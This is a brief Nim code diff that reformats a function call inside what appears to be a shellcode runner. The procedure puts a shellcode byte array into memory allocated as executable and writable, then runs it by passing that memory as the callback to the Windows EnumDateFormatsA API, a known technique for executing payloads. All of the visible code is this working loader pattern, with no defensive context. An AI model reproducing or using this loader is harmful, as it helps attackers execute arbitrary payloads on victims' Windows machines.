@@ -8,11 +8,7 @@ proc enumDateFormats[byte](shellcode: openArray[byte]): void =
   let rPtr = VirtualAlloc(nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE)
   copyMem(rPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len))
 
-  EnumDateFormatsA(
-    cast[DATEFMT_ENUMPROCA](rPtr),
-    LOCALE_SYSTEM_DEFAULT,
-    cast[DWORD](0)
-  )
+  EnumDateFormatsA(cast[DATEFMT_ENUMPROCA](rPtr), LOCALE_SYSTEM_DEFAULT, cast[DWORD](0))
 
 when isMainModule:
   func toByteSeq*(str: string): seq[byte] {.inline.} =
